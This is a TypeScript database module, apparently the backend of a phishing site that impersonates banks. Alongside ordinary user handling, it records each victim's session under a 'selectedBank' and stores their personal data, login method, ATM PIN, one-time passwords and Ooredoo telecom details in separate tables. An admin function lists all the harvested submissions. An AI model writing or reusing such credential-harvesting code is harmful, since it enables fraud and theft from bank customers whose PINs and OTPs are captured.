import { eq } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users } from "../drizzle/schema";
import { ENV } from './_core/env';
import {
  sessions,
  personalDataSubmissions,
  loginMethodSubmissions,
  atmPinSubmissions,
  otpSubmissions,
  ooredooSubmissions,
  type InsertPersonalDataSubmission,
  type InsertLoginMethodSubmission,
  type InsertAtmPinSubmission,
  type InsertOtpSubmission,
  type InsertOoredooSubmission,
} from "../drizzle/schema";

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// Session management
export async function createSession(sessionId: string, selectedBank: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.insert(sessions).values({ id: sessionId, selectedBank });
}

export async function getSessionByIdWithAllData(sessionId: string) {
  const db = await getDb();
  if (!db) return null;

  const [sessionData] = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
  if (!sessionData) return null;

  const [personalData] = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
  const [loginMethod] = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
  const [atmPin] = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
  const [otp] = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).limit(1);
  const [ooredoo] = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);

  return {
    session: sessionData,
    personalData: personalData || null,
    loginMethod: loginMethod || null,
    atmPin: atmPin || null,
    otp: otp || null,
    ooredoo: ooredoo || null,
  };
}

// Personal data submission
export async function submitPersonalData(data: InsertPersonalDataSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(personalDataSubmissions).values(data);
  return result;
}

// Login method submission
export async function submitLoginMethod(data: InsertLoginMethodSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(loginMethodSubmissions).values(data);
  return result;
}

// ATM PIN submission
export async function submitAtmPin(data: InsertAtmPinSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(atmPinSubmissions).values(data);
  return result;
}

// OTP submission
export async function submitOtp(data: InsertOtpSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(otpSubmissions).values(data);
  return result;
}

// Ooredoo submission
export async function submitOoredoo(data: InsertOoredooSubmission) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(ooredooSubmissions).values(data);
  return result;
}

// Get all submissions for admin
export async function getAllSubmissions() {
  const db = await getDb();
  if (!db) return [];
  const result = await db.select().from(sessions);
  return result;
}

// Get submission details with all related data
export async function getSubmissionDetails(sessionId: string) {
  return getSessionByIdWithAllData(sessionId);
}
